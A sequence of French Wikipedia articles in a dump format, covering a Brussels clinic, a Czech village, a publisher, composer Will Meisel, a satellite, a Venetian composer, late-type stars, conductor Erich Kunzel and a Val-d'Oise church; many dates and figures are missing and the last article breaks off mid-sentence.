Elle fut construite sous l'égide de l'architecte Fernand Brunfaut en 1923. Elle se situait alors aux n° 54-56 de la rue Philippe de Champagne à Bruxelles. Les locaux d'origine sont constitués de l'aménagement d'une maison du troisième quart du et d'un immeuble situé à l'arrière, construit en 1912-1914. Ces locaux sont abandonnés au profit de ceux des hospices réunis, situés entre les rues voisines d'Accolay, du Poinçon et des Alexiens.En 1998, l'hôpital était fusionné à l'Hôpital Français dans le centre hospitalier François Rabelais, dans le but d'optimaliser les services existants des deux institutions. Au début de l'année 2002, une partie des activités hospitalières comme la pédiatrie et les soins intensifs est transférée depuis la clinique César de Paepe vers l'Hôpital Français. Le but est du recentrage des activités est d'adapter le budget de fonctionnement du centre hospitalier aux financements reçus. Parallèlement, les services de gériatrie et de psychiatrie, ainsi que l'activité chirurgicale de jour sont développés.
Le , la Clinique César De Paepe intégrait le CHU Saint-Pierre à la suite de la signature d'une convention-cadre le entre la Ville et le CPAS de Bruxelles, l'Université libre de Bruxelles, le réseau hospitalier IRIS et l'hôpital universitaire Erasme. Pour ce faire, l'asbl Hôpital français-César De Paepe a cédé les actifs de l'hôpital César De Paepe au CHU Saint-Pierre pour un montant de deux millions d'euros.

</doc>
<doc id="8978415" url="https://fr.wikipedia.org/wiki?curid=8978415" title="Bruno Sanchez">
Bruno Sanchez



</doc>
<doc id="8978417" url="https://fr.wikipedia.org/wiki?curid=8978417" title="Vilémov (district de Havlíčkův Brod)">
Vilémov (district de Havlíčkův Brod)

Vilémov est un bourg () du district de Havlíčkův Brod, dans la région de Vysočina, en République tchèque. Sa population s'élevait à habitants en 2020.
Géographie.
Vilémov se trouve à à l'est de Golčův Jeníkov, à au nord de Havlíčkův Brod, à au sud-est de Kutná Hora, à au nord de Jihlava et à à l'est-sud-est de Prague.
La commune est limitée par Zvěstovice, Kněžice et Ronov nad Doubravou au nord, par Heřmanice et Kraborovice à l'est, par Uhelná Příbram au sud-est et au sud, par Leskovice et Rybníček au sud, et par Habry et Golčův Jeníkov à l'ouest.
Histoire.
La première mention écrite de la localité date de 1119.
Transports.
Par la route, Vilémov se trouve à de Golčův Jeníkov, à de Havlíčkův Brod, à de Jihlava et à de Prague.

</doc>
<doc id="8978419" url="https://fr.wikipedia.org/wiki?curid=8978419" title="Nova vul 1670">
Nova vul 1670



</doc>
<doc id="8978423" url="https://fr.wikipedia.org/wiki?curid=8978423" title="Éditions de l'Entre-deux-Mers">
Éditions de l'Entre-deux-Mers

Les Éditions de l'Entre-deux-Mers sont une maison d'édition française fondée en 2001 à Saint-Quentin-de-Baron au cœur de la région naturelle de l'Entre-deux-Mers dans le département de la Gironde en région Aquitaine. 
Elle poursuit de manière autonome, sous la forme d'une association loi de 1901 dirigée par Bernard Larrieu, l'activité éditoriale du Comité de liaison des associations historiques de l'Entre-deux-Mers (Clem) à l'origine de sa fondation.
Spécialisée dans l'édition de documents historiques inédits et dans l'iconographie du patrimoine régional du au siècle comme l'histoire de la pêche en Atlantique ou de la construction navale à Bordeaux, elle publie une longue série d'albums consacrés aux dessins de Léo Drouyn. 
Attachée à une politique de diffusion auprès d'un large public elle entoure ses publications d'actions culturelles comme "La Fête à Léo et au patrimoine girondin" élargi aux départements de la Dordogne et de Lot-et-Garonne.
Publications.
Les ouvrages sont édités dans les collections « Archives et chroniques d'Aquitaine », « Mémoire locale », « L'Esprit des lieux », « Images du patrimoine, patrimoine de l'image », « Léo Drouyn, les albums de dessins », « Le Petit patrimoine rural diffus de la juridiction de Saint-Émilion », « Petite bibliothèque Léo Drouyn », « Portraits en cent et un tableaux » ou « Le Masson du Parc » (en coédition avec les Archives nationales).

</doc>
<doc id="8978429" url="https://fr.wikipedia.org/wiki?curid=8978429" title="Will Meisel">
Will Meisel

Will Meisel (William Augustus Meisel le à Rixdorf et décédé le à Müllheim) est un danseur, compositeur et éditeur allemand.
Biographie.
Will Meisel est le fils du maître de ballet Emil Meisel et son épouse Olga Loepke. Il naît à Rixdorf (Berlin), Steinmetzstraße 20 (aujourd'hui Kienitzer Straße). Il fréquente l'école secondaire Albrecht Dürer à Berlin-Neukölln. Dès 5 ans, il apprend la musique et à 10 ans, la danse. Il fait partie du corps de ballet de l'Opéra d'État de Berlin. De à , Will Meisel est soldat pendant Première Guerre mondiale. Il est blessé et gazé à Ypres en 1917. Après la guerre, de 1918 à 1923, il retrouve son poste à l'Opéra d'État de Berlin.
Le , il fonde la maison d'édition Meisel GmbH &amp; Co. Sa première publication est "Ilona" sur un livret de son épouse d'alors Ilona von Fövenyessy von Hewi.Ce mariage est rompu et Will Meisel épouse en secondes noces Eliza Illiard, avec qui il a deux fils, Peter (1935 - 2010) et Thomas (1940 - 2014).
Après la prise du pouvoir par les nazis, il entre le au NSDAP (carte de membre du parti 2849490). Il travaille ensuite comme compositeur de musique de film et d'opérettes. Il écrit également des pièces de propagande nazie. Le , quelques jours après la Nuit de Cristal, il exprime dans une lettre à Hans Hinkel son intérêt pour l'acquisition d'un éditeur aryanisé, les Éditions Peters.
À la fin de la Seconde Guerre mondiale, Meisel réside à Berlin et devient producteur de films. À son domicile de la Jonas Straße, à Berlin-Neukölln, il dirige une école de danse. Il est décore du Paul-Lincke-Ring et de la Bundesverdienstkreuz.
Will Meisel écrit la musique pour quarante-quatre films , huit opérettes et de nombreuses chansons (« Berlin bleibt doch Berlin », « Wir wollen Freunde sein fürs ganze Leben », « Fräulein Pardon », « Weekend » et beaucoup d'autres). Ses opérettes "Königin einer Nacht" et "Die Frau im Spiegel" font l'objet d'adaptations cinématographiques
Will Meisel et Eliza Illiard sont inhumés dans le cimetière de Wilmersdorf.

</doc>
<doc id="8978430" url="https://fr.wikipedia.org/wiki?curid=8978430" title="AsiaSat 8">
AsiaSat 8

AsiaSat 8 est un satellite de télécommunications chinois en orbite géostationnaire exploité par la Asia Satellite Telecommunications Company, communément appelée AsiaSat. Il a été construit par la société américaine Space Systems/Loral.
Description.
Il est basé sur la plate-forme .

</doc>
<doc id="8978431" url="https://fr.wikipedia.org/wiki?curid=8978431" title="Antonino Biffi">
Antonino Biffi

Antonino Biffi (Venise, 1666 – Venise, 1733 ou ) est un compositeur, maître de chapelle et contreténor italien.
Biographie.
Il a vraisemblablement suivi l'enseignement de Giovanni Legrenzi. Le , il est entré comme contreténor dans le chœur de la Cappella Marciana de la basilique Saint-Marc. Après seulement une semaine, les procureurs lui ont confié la tâche d'aider le maître de chapelle titulaire Gian Domenico Partenio. Après la mort de celui-ci qui est survenue en 1701, Biffi a présenté une demande pour obtenir le poste vacant; les autres candidats étaient: le vice-maître de chapelle Carlo Francesco Pollarolo, Antonio Lotti et Benedetto Vinaccesi, les deux derniers organistes de la Basilique. Biffi a été choisi et a été officiellement nommée le . Il a occupé le poste de directeur de la chapelle jusqu'à sa mort. Il a également succédé à Partenio au poste de directeur et chef de chœur du "Conservatorio dei Mendicanti". Parmi ses élèves, on trouve Giovanni Battista Ferrandini et peut-être Daniel Gottlob Treu.
Les compositions de Biffi, principalement de la musique sacrée, sont généralement influencées par l'école vénitienne, qui se caractérise par une musique particulièrement expressive et riche en couleur. Malgré tout, ces influences sont «modérées» par l'école romaine plus sobre. il a tendance à utiliser le style concertato, mettant au second plan, l'utilisation du contrepoint.
Œuvres.
Antonino Biffi n'a composé que de la musique sacrée :

</doc>
<doc id="8978433" url="https://fr.wikipedia.org/wiki?curid=8978433" title="Étoile de type tardif">
Étoile de type tardif

Une étoile de type tardif (calque de l'anglais "") est une étoile de type spectral K, M, S ou C, dont la température de surface est inférieure à celle du Soleil.
Au sein d'une "classe" spectrale, on peut aussi parler de type tardif : une étoile G tardive sera de type G"n" avec "n" proche du maximum (~G6,5 et plus), une naine M tardive sera de type M"n" avec "n" proche du maximum (~M6,5 et plus, donc en l'occurrence les naines brunes les plus chaudes).

</doc>
<doc id="8978434" url="https://fr.wikipedia.org/wiki?curid=8978434" title="Erich Kunzel">
Erich Kunzel

Erich Kunzel né à New York, le et mort à Bar Harbor (Maine) le est un chef d'orchestre américain. Appelé le « "Prince des Pops" » par le Chicago Tribune, il a joué avec un certain nombre d'orchestres symphoniques et de grands ensembles de musique légère, "Pops Orchestra", en particulier le "Cincinnati Pops Orchestra" (CPO), qu'il a dirigé pendant .
Biographie.
Formation.
Kunzel est né de parents allemands, immigrés à New York. Il grandit dans le Queens et à Greenwich dans le Connecticut. Au , il effectue des arrangements et joue du piano, de la contrebasse et des timbales. Initialement destiné à être chimiste, Kunzel est diplômé du Dartmouth College avec un diplôme en musique ; puis il étudie à l'Université Harvard et obtient sa maîtrise à l'Université Brown. Il dirige le "Brown University Glee Club" pendant au moins deux ans.
Dès 1957, Kunzel dirige l' et étudie à l'École Pierre Monteux. Il rencontre sa femme, Brunhilde, d'origine autrichienne, en dirigeant "Gianni Schicchi" de Puccini à Santa Fe en 1964. Ils se marient l'année suivante. De 1960 à 1965, il dirige l'. De 1965 à 1977, Kunzel assure le poste de chef associé à l'Orchestre symphonique de Cincinnati (CSO).
En 1969, il est membre honoraire de la branche d'Eta-Omicron de , fraternité musicale du Conservatoire de musique de l'Université de Cincinnati. Il est aussi un responsable national de , une fraternité internationale de musiciens professionnel.
Pops.
En 1965, Kunzel commence une première série de concerts "Pops" aux États-Unis, pendant la saison d'hiver, les « "Eight O’Clock Pops" ». À partir de 1970, à l'invitation de Arthur Fiedler et de ses successeurs, Kunzel effectue plus de 100 concerts avec le "Boston Pops Orchestra". Lorsque le conseil d'administration du "Cincinnati Symphony Orchestra" décide de créer le "Cincinnati Pops Orchestra" en 1977, Kunzel en est nommé chef principal. Le "Pops Orchestra" – le symphonique et le "Pops" ont les mêmes musiciens et ne se distinguent que par leur style et le répertoire –, devient le plus grand des deux orchestres de Cincinnati. Le chef d'orchestre Max Rudolf qui dirige l'orchestre symphonique de 1958 à 1970, a également joué avec le "Pops Orchestra". Kunzel est actif avec d'autres orchestres symphoniques, dirigeant régulièrement l’"Orchestre symphonique d'Indianapolis" (comme chef principal du répertoire "Pops") de 1982 à 2002.
C'est à l'occasion de la création du "Pops Orchestra" qu'un article du Chicago Tribune en 1977 qu'un journaliste écrit de lui qu'il est le « "Prince des Pops" ». Et en effet, dès le début, Kunzel s'est efforcé d'étendre le rayonnement des "Cincinnati Pops" dans le monde. Il enregistre pour la compagnie "Vox Records" à la fin des années 1970 et à l'ère numérique laisse près de 90 enregistrements sur la firme Telarc (fondée la même année que le "Pops"), dont la plupart sont devenus des succès d'édition. Il s'est donné pour mission avec le "Pops" d'élargir aux oreilles du public, la musique symphonique, avec un répertoire accessible et sur le ton du divertissement. Doué d'une avenante présence pour le public, il n'hésite pas a plaisanter avec ses musiciens. Le répertoire dirigé comprend aussi bien « l'Ouverture 1812 », des œuvres de Copland, les Beatles et Billy Joel. Ses enregistrements populaires de la musique classique, comédies musicales de Broadway, et des dizaines de films à travers le monde ont dépassé les hit-parades du "crossover", plus que tout autre chef ou orchestre dans le monde. Certains des élèves et assistants de Kunzel aux "Cincinnati Pops" deviendront plus tard célèbres, notamment Keith Lockhart avec le "Boston Pops" et Steven Reineke avec l'ensemble "".
Les "Cincinnati Pops" étaient particulièrement populaire en Asie. À partir de 1990, l'ensemble visite le Japon à plusieurs reprises. En 1998, Kunzel est devenu le premier chef d'orchestre américain de "Pops" à effectuer une tournée en Chine. Dix ans plus tard, lui et les "Cincinnati Pops" sont invités à revenir à l'occasion des Jeux olympiques d'été de 2008 à Pékin. Ils étaient le seul orchestre américain à jouer lors de l'événement.
Durant sa carrière, il est régulièrement invité des plus grands orchestres comme l'Orchestre de Philadelphie, l'Orchestre symphonique de Londres, l'Orchestre symphonique de San Francisco ou le Chicago Symphony, et se produisait régulièrement au Carnegie Hall.
Récompenses.
Kunzel fait la plupart de ses enregistrements de musique classique en tant que directeur des "Cincinnati Pops". Toutefois, il a également fait en big band des enregistrements de jazz avec Dave Brubeck, Gerry Mulligan, Duke Ellington (pour Decca), et d'autres artistes de renom. Sur la pelouse du Capitole, Kunzel a dirigé le National Symphony Orchestra, à chaque "Memorial Day" (en mai) et pour l’"Independence Day" (le ), de 1991 à 2009, dans des concerts télévisés sur la chaîne nationale PBS. En 1987, son album ' d'Aaron Copland (CD-80117) avec la récitante Katharine Hepburn, a reçu un "Grammy Awards" ; il comprend aussi les ' arrangés par Aaron Copland et chantés par le baryton Sherrill Milnes. D'autres nominations aux "Grammy Awards" sont venues en 1989 ("A Disney Spectacular"), 1991 ("The Music Man" de Meredith Willson) et 1993 ("Amen! – A Gospel Celebration"). En 1989 l'album "American Jubilee" a remporté, en France, le Grand Prix du Disque de l'Académie Charles-Cros : il reflète le répertoire américain fleurissant autour du dans les nombreux concerts de plein air. Ses albums comprennent souvent des effets sonores numériques créées par l'ingénieur du son . Kunzel a enregistré aussi des partitions de musique de films de John Williams, Jerry Goldsmith, James Horner, Miklós Rózsa, Bernard Herrmann, Erich Wolfgang Korngold, etc. dans plusieurs disques thématiques (western, film d'horreur, ["seafaring films"]...).
Le chef a eu localement une grande influence sur la scène musicale de Cincinnati. En plus de diriger des concerts d'abonnement presque hebdomadaires avec les "Cincinnati Pops", il a élargi le programme "Pops" en 1984, afin d'inclure une série de concerts d'été au "", nouvellement construit au bord de la rivière Ohio. Il a contribué à un nouveau campus pour accueillir le public de la ville à l'. Il a invité de nombreux artistes locaux, y compris les chœurs d'enfants et les étudiants du College-Conservatory of Music à partager la scène avec le "Pops Orchestra".
L'ingénieur du son du disque Copland de Kunzel, a obtenu un "Grammy Award" de la en 1998, "The Music of America" d'Aaron Copland. Kunzel a gagné en 2006, la "National Medal of Arts". En 2009, il a été intronisé à l', de Cincinnati.
Les 20 et Kunzel a dirigé l'Orchestre symphonique de Toronto pour interpréter le "" au Roy Thomson Hall de Toronto.
Derniers jours.
En , est diagnostiqué un cancer du pancréas, du foie et du côlon. Il reçoit des traitements de chimiothérapie à Cincinnati. Il a donné son dernier concert au centre de musique de Riverbend le . Il est mort un mois plus tard, à Bar Harbor, dans le Maine, près de sa maison, située sur Swan's Island. Ce jour-là, le conseil d'administration du "Cincinnati Pops Orchestra" le nomme à titre posthume, du "Pops Orchestra".

</doc>
<doc id="8978437" url="https://fr.wikipedia.org/wiki?curid=8978437" title="Église Saint-Sulpice de Villiers-Adam">
Église Saint-Sulpice de Villiers-Adam

L’église Saint-Sulpice est une église catholique paroissiale située à Villiers-Adam, dans le Val-d'Oise (France). Son clocher sans caractère remonte au . Sinon, l'église date pour l'essentiel du second quart du , et affiche le style gothique flamboyant, parsemé d'éléments de la Renaissance. Ceci concerne les chapiteaux du vaisseau central, l'ensemble du décor des deux travées à l'est du clocher, et la frise ainsi que les couronnements des contreforts à l'extérieur des parties orientales. La nef de l'église est restée inachevée, et n'a jamais été voûtée ; son bas-côté sud n'a jamais été réalisée. En revanche, le chœur est d'autant plus remarquable, et se distingue par sa longueur de quatre travées droites plus une abside à pans obliques, sa hauteur, son architecture soignée, et bien sûr le reflet de la transition du style flamboyant vers la Renaissance. La bénédiction du grand autel par René Le Roullier, évêque de Senlis, en date du , marque sans doute la fin des travaux dans le vaisseau central du chœur. La nef a probablement pris sa forme actuelle quelques années plus tard. Au début du , le sanctuaire a été muni d'un grand retable de pierre de style baroque, représentatif du courant spirituel et artistique de la Contre-Réforme dans la région. L'église a été classée aux monuments historiques par arrêté du , et restaurée par la suite. Elle est aujourd'hui affiliée à la paroisse de Méry-sur-Oise, et n'accueille des messes dominicales qu'un samedi soir par mois, tout au plus.
Localisation.
L'église Saint-Sulpice est située en France, en région Île-de-France et dans le département du Val-d'Oise, dans la vallée de l'Oise, aux confins de la forêt de Montmorency, sur la commune de Villiers-Adam, au centre du village, dans l'angle des rues Benjamin-Godard, à l'ouest, et Aristide-Briand, au sud. Une maison, qui abrite la bibliothèque municipale et l'agence postale municipale, est plaquée devant le mur occidental de l'église, de sorte qu'il n'y a pas de façade. Seulement le clocher présente son mur occidental. L'élévation méridionale est alignée sur la rue Aristide-Briand, et le chevet donne sur une grande pelouse appartenant à la commune, ce qui le dégage d'autres édifices et le met bien en valeur. L'élévation septentrionale est en revanche bordée par un jardin privé, et l'on ne peut pas la contempler en prenant du recul.
Histoire.
L'histoire de la paroisse.
Villiers-Adam est mentionné pour la première fois dans une bulle pontificale d'Eugène III datée de 1147, et dans des lettres de Thibaud, évêque de Paris de 1143 (environ) à 1159. Sous l'Ancien Régime, la paroisse relève du doyenné de Montmorency, et de l'archidiaconé et du diocèse de Paris. Le saint patron de la paroisse est Sulpice le Pieux, dit aussi saint Sulpice de Bourges. Le collateur de la cure change plusieurs fois au fil des siècles, à des dates et dans des circonstances qui restent à éclaircir. Du temps de saint Louis, le prieur de Conflans-Sainte-Honorine nomme à la cure. Ensuite, ce droit semble passer à l'abbé du Bec, dont dépend le prieuré de Conflans. Les provisions du , du et du reconnaissent la présentation de l'abbé du Bec. Les pouillés rédigés au , en 1668 et en 1692 affirment que la cure soit à la présentation de l'abbé de Saint-Martin de Pontoise. Au moins dans le premier cas, ce semble être une contradiction. Par ailleurs, la bulle et les lettres déjà citées indiquent que deux parts de la dîme de Villiers-Adam appartiennent aux moines de Saint-Martin-des-Champs. Mériel est à l'origine un hameau de Villiers-Adam, qui n'en est démembré et érigé en paroisse indépendante qu'en 1713. L'on peut également signaler la présence de l'abbaye Notre-Dame du Val sur la paroisse de Villiers-Adam. À la Révolution française, le diocèse de Versailles est érigé pour regrouper l'ensemble des paroisses sur le territoire du département de Seine-et-Oise. Le redécoupage des départements d'Île-de-France conduit à la création du diocèse de Pontoise correspondant au territoire du département du Val-d'Oise, en 1966. Villiers-Adam en fait désormais partie. Le village ne forme plus une paroisse indépendante, et dans le cadre de l'ensemble paroissial avec Méry-sur-Oise, Mériel et Frépillon, l'église est desservie par le curé de Méry-sur-Oise. Les messes dominicales sont célébrées en l'église Saint-Sulpice un samedi par mois, à 18 h 30, avec une interruption en hiver.
L'histoire de l'église.
La partie la plus ancienne de l'église actuelle est incontestablement le clocher, qui, selon l'abbé Lebeuf date au plus tard du , et selon le baron Ferdinand de Guilhermy, sans réserve du . Il n'est pas clair sur quelle base se fondent Botto "et al." pour affirmer que ce serait le seul vestige de l'église primitive, qui peut bien être d'origine plus ancienne, ou au moins la chapelle qui a pu la précéder. Pour Jean-Marie Pérouse de Montclos, la construction de l'église actuelle aurait débuté vers 1490. Cette affirmation devrait se fonder sur l'analyse archéologique du monument, dont le style correspond néanmoins plutôt à la période flamboyante tardive (bases des piliers en forme de plinthes moulurées). Comme date de fin de construction, l'on dispose de la date de bénédiction du grand autel par René Le Roullier, évêque de Senlis, le , et de la date de la consécration des deux autels latéraux dédiés à Notre-Dame et Saint-Sébastien, par le même prélat, le . Ces deux dernières dates concordent avec le style Renaissance des chapiteaux et des clés de voûte, et la modénature de plusieurs voûtes. Mais l'abbé Lebeuf a déjà remarqué que le style gothique flamboyant ne correspond pas au milieu du . Pour expliquer cette incohérence stylistique, il dit que l'on voulut imiter le gothique, ce qui est possible, puisque l'église de Précy-sur-Oise a été reconstruite à partir de 1570 dans un style toujours gothique flamboyant. Si en revanche l'on préfère adhérer à la date de 1490 fournie par Pérouse de Montclos, l'on devra admettre une interruption du chantier après l'élévation des murs et des piliers. Le chœur aurait donc été recouvert d'un plafond provisoire pendant quelques décennies, comme c'est toujours le cas de la nef et de son bas-côté. Ces parties datent aussi du . Botto "et al." supposent que ce sont les guerres de Religion des années 1562-1598 qui motivent leur inachèvement.
La clé de voûte de la seconde travée du collatéral nord conserve une inscription tracée au crayon par un restaurateur, . — L'église est classée aux monuments historiques par arrêté du , à l'exception de la nef (et certainement aussi de son bas-côté). Sous l'impulsion de l'architecte en chef des monuments historiques Jules Formigé et l'inspecteur Pierre Paquet, plusieurs tranches de restauration sont entreprises par la suite, mais les délais entre le premier projet et l'autorisation d'effectuer les travaux sont souvent longs. La première tranche, entre le et le , porte sur la reprise des parements, l'enlèvement des abat-son, la réfection des gouttières, la réparation des couvertures autour du clocher, et le remplacement de la vitrerie des trois baies inférieures. En 1937, la réfection de la couverture en tuiles des bas-côtés est ajoutée à la liste des travaux à effectuer, et terminée le . La deuxième tranche, entre le et le , porte sur un complément de la restauration des façades, des parements extérieurs du clocher et de la flèche. Ensuite, Jules Formigé soumet un devis descriptif et estimatif pour le remplacement de la vitrerie par des vitraux à losanges, le , et l'achèvement de la restauration du clocher, le . Ces projets restent sans suite en raison de l'éclatement de la Seconde Guerre mondiale. En 1940, un ouragan endommage les toitures. Les réparations nécessaires ne sont effectuées qu'à partir du mois de février 1942. Les verrières sont endommagées par faits de guerre. En 1952, le nouvel architecte en chef des monuments historiques, Sylvain Stym-Popper (nommé en 1951) préconise quelques travaux importants de gros entretien et de réparation aux maçonneries extérieures, et aux toitures. Les travaux ne sont lancés qu'au mois de juin 1955. En plus, la couverture du clocher est réparée à l'automne 1961, et un vitrail du clocher est réparé fin 1962. Mais en 1963, la foudre détériore de nouveau la couverture du clocher, et un paratonnerre est installé début juin 1965. Rien n'est entrepris jusqu'au début des années 1980. Sur décision de Pierre-André Lablaude, la voûte du chœur est étayée d'urgence au printemps 1980, et elle est enfin réparée par l'entreprise MPR en 1985 / 1986. En attendant, la reprise des fondations du contrefort sud-est du clocher est achevée à l'automne 1982, et la reprise des fondations du clocher se poursuit en 1984 / 1985. Le collatéral sud présente actuellement des désordres de structure, et le dernier arc-doubleau a dû être étayé.
Description.
Aperçu général.
Orientée à peu près régulièrement, l'église se compose d'une nef non voûtée de trois travées, accompagnée d'un unique bas-côté au nord, également non voûté ; d'un chœur de quatre travées auxquelles s'ajoute une abside sur plan trapézoïdal ; d'un collatéral nord du chœur ; de la base du clocher au sud de la première travée du chœur ; et d'un collatéral sud du chœur. Les deux collatéraux du chœur comptent trois travées et se terminent par un chevet plat, mais puisque le collatéral sud ne commence qu'à partir de la seconde travée du vaisseau central, il va plus loin à l'est que son homologue au nord. Une sacristie occupe l'angle entre le collatéral nord et la dernière travée du vaisseau central. L'ensemble du chœur et de ses collatéraux est voûté d'ogives. L'on accède à l'église par le portail méridional de la deuxième travée de la nef, ou par une petite porte à l'ouest de la base du clocher.
Intérieur.
Nef et bas-côté.
La nef se caractérise, pour l'essentiel, par son plafond provisoire et sa charpente partiellement apparente ; par ses trois fenêtres en plein cintre au remplage Renaissance, s'inscrivant dans des arcs de décharge brisés ; par ses supports engagés dans le mur méridional ; et, surtout, par ses grandes arcades au nord. Au nombre de trois, elles sont identiques aux trois grandes arcades au nord du chœur, ainsi qu'à la dernière grande arcade du sud. Le critère pour la distinction entre nef et chœur est donc le voûtement d'ogives uniquement présent dans le chœur, sachant que la construction et l'entretien du chœur étaient à la charge des gros décimateurs, alors que la construction et l'entretien de la nef incombaient aux paroissiens sous l'Ancien Régime. Cette circonstance explique souvent l'absence de voûtement de la nef, et son architecture plus simple, comme par exemple à Asnières-sur-Oise, Écouen, Jouy-le-Comte, Maffliers, Presles, Vauréal, etc. Étant donné l'homogénéité des grandes arcades sur toute leur longueur, on peut toutefois admettre que la dernière travée de la nef et de son bas-côté auraient été voûtées, et considérer donc la partie de l'église située au nord du clocher comme faisant partie de la nef des fidèles. Il serait nécessaire de retrouver les comptes de la fabrique et d'éventuels contrats passés entre les habitants et les gros décimateurs pour trancher la question. Les grandes arcades sont en arc brisé, et affichent un profil prismatique composé d'un renflement dans l'intrados, et, du haut vers le bas, d'une étroite gorge, d'une rainure et d'une large gorge sur chaque face latérale. Ces arcades se fondent dans des piliers monocylindriques appareillés en tambour, comme à Bessancourt, Boran-sur-Oise, La Chapelle-en-Serval, Jagny-sous-Bois, Mont-l'Évêque, Précy-sur-Oise, Survilliers, Le Thillay et Vineuil-Saint-Firmin. Les piliers n'ont ni chapiteaux ni frises, mais comme particularité, ils sont bagués à un tiers de leur hauteur, où ils sont profilés d'un boudin aplati et d'un quart-de-rond. Les bases se résument à une simple plinthe mouluré, et reposent sur des socles octogonaux. Au-dessus des piliers, qui font légèrement saillie devant les surfaces des murs hauts, des faibles ondulations montent jusqu'aux chapiteaux des hautes-voûtes, qui sont doriques, et reflètent le goût de la Renaissance.
Les piliers engagés dans le mur méridional sont analogues à leurs homologues des grandes arcades, y compris les bagues et les chapiteaux. L'absence de bas-côté sud et la présence d'une arcade bouchée dans le mur occidental du clocher donnent à penser que la nef soit restée inachevée, mais le mur du sud ne semble pas du tout provisoire. En effet, les fenêtres sont munies d'un remplage de trois formes en plein cintre, dont celle au centre est plus élevée que les deux autres. Les meneaux affectent un profil chanfreiné simple. Un faible ébrasement entoure les fenêtres. En haut, s'y ajoutent les arcs de décharge déjà signalés, moulurés à l'instar des faces latérales des grandes arcades. Ces arcs de décharge sont en plus situés à la même hauteur que les grandes arcades. Il paraît donc que ce sont en réalité les grandes arcades du sud, déjà exécutées au milieu du , et fermées provisoirement par des lattes, avant que la décision ne soit prise de ne pas mettre en œuvre le bas-côté sud, ce qui aurait entraîné la mise en place des fenêtres actuelles, quelques années après la bénédiction du maître-autel. Pour venir au plafond, il possède un pan oblique du côté sud, et présente un début de voûte en berceau au nord. Peu après la première panne intermédiaire (en comptant depuis le bas), le plafond devient plat. En plus des deux pannes, l'on aperçoit de la charpente trois entraits, situées au-dessus des piliers intermédiaires et à l'intersection entre la nef et le chœur, et les arbalétriers et poinçons correspondants. Quant au bas-côté, il est dénué de caractère. Son plafond est le revers du toit en appentis, avec charpente apparente. Le mur du nord est percé de trois petites fenêtres en plein cintre sans ébrasement ni décoration, qui sont susceptibles d'être modernes. La première travée abrite les fonts baptismaux.
Chœur.
La première travée du chœur est particulière, car elle est délimitée au sud par le clocher. Des contreforts plats font saillie dans la nef. Entre ces deux contreforts, et à une certaine distance, s'ouvre une arcade en tiers-point non moulurée, aux arêtes abattues. Cette arcade retombe sur des tailloirs ou impostes, et dans les angles entre les piliers de l'arcade et les contreforts, subsistent deux colonnettes à chapiteaux du , qui devaient supporter les ogives de la travée correspondante de la précédente église. Son vaisseau central devait donc être beaucoup moins élevé, et le départ d'arc-doubleau visible sur le contrefort à droite de l'arcade parle dans le même sens. Au-dessus de l'arcade, court un bandeau horizontal, et le premier étage du clocher est percée d'une petite baie en plein cintre, sans ébrasement ni décoration. Elle est fermée par une grille en bois, et la base du clocher est fermée par une cloison en bois, afin de servir de local de rangement ou deuxième sacristie. Après le clocher, le vaisseau central du chœur s'élargit vers le sud, c'est-à-dire, les grandes arcades du sud ne sont pas situées dans l'axe de l'arcade au nord de la base du clocher.
Le vaisseau central du chœur comporte quatre travées droites, qui présentent généralement une élévation sur trois niveaux, avec l'étage des grandes arcades et un étage de murs hauts aveugles au-dessus des grandes arcades, sauf la quatrième travée côté nord, qui est éclairée par une haute fenêtre à l'instar de l'abside. Les grandes arcades du nord et la dernière grande arcade du sud ont déjà été décrites dans le contexte de la nef. Les deux premières grandes arcades du sud (sans compter la base du clocher) sont différentes, et leurs faces latérales sont taillées en biseau, délimité supérieurement par une rainure, tandis que l'intrados est mouluré d'un large boudin au milieu d'un méplat. Ces arcades sont en cintre surbaissé, et ne se fondent pas dans les piliers, mais sont reçues sur des culs-de-lampe dans le goût de la Renaissance. Leurs corbeilles sont sculptées d'une tête de chérubin entre deux ailes, et les tailloirs comportent un rang de feuilles simples, un rang de denticules esquissés, et un rang d'oves. À l'est du clocher, le cul-de-lampe est directement engagé dans la pile du clocher. Dans l'ensemble du chœur, l'on trouve des chapiteaux du second ordre différents de ceux de la nef. Leurs tailloirs repètent le décor observé sur leurs homologues des culs-de-lampe, tandis que les corbeilles sont revêtues de feuilles d'acanthe, avec des fleurettes dans les écoinçons. L'on trouve des chapiteaux identiques à l'angle nord-est de l'église de Conflans-Sainte-Honorine, dans le bas-côté de Jouy-le-Comte, et sur les arcades latérales du chœur de Maffliers. Les voûtes ont des doubleaux et formerets en arc légèrement brisé, et les nervures affichent un profil prismatique. Dans la troisième travée, les ogives sont complétées par quatre liernes qui se distinguent par leur modénature méplate, tandis que la voûte de la quatrième travée est agrémentée de liernes et tiercerons selon le dessin habituel, avec une clé principale et quatre clés secondaires. Dans la dernière travée, qui est de plan trapézoïdal, l'on s'est contenté de quatre branches d'ogives, comme pour une voûte ordinaire. Les clés de voûte sont des disques au décor végétal. Les bordures de certaines clés sont décorées de motifs de la Renaissance.
La dernière travée droite du vaisseau central ne possède qu'une grande arcade que du côté sud, tandis que le mur septentrional est ajouré d'une grande fenêtre, comme à Groslay, où cette disposition est probablement imputable au prolongement du collatéral sud. La partie à pans coupés de l'abside est voûtée à part, comme à Jouy-le-Comte, Groslay, La Chapelle-en-Serval, Mont-l'Évêque et au Thillay. Il en résulte une travée sur plan trapézoïdal. Par ailleurs, il semble que le maître d'œuvre a modifié son projet au cours des travaux, ou il y avait une interruption du chantier, car le doubleau ouvrant sur la travée à pans coupés ne retombe pas sur l'ondulation la plus proche de la dernière grande arcade du sud, qui reste ainsi sans fonction. Néanmoins, les supports de l'abside sont des piliers monocylindriques engagés dans les murs, conformément au parti retenu pour les autres parties du vaisseau central. L'on trouve ici des chapiteaux librement inspirés de l'ordre corinthien, dont ceux au nord et au sud-est sont les plus intéressants. Sur le premier, les volutes d'angle sont remplacés par des têtes de cheval, et une tête humaine se profile au milieu du tailloir, entre deux angles. Sur le second, l'on trouve des volutes plus classiques, mais un vase et la tête d'un jeune enfant se dégagent au milieu des deux faces. De telles libertés ont souvent été prises par rapport au modèle antique, comme par exemple à Cauvigny, Louvres et Villiers-le-Bel, où l'influence de la Renaissance italienne est plus marquée, ou dans les collatéraux de la cathédrale Saint-Maclou de Pontoise. En ce qui concerne les fenêtres, celle de la travée droite est désaxée vers l'est, et possède un remplage à trois lancettes à têtes tréflées, surmontées de trois soufflets et deux mouchettes. Les trois baies du chevet ne comptent que deux lancettes à têtes tréflées, surmontées d'un seul soufflet et de deux mouchettes. L'on note les 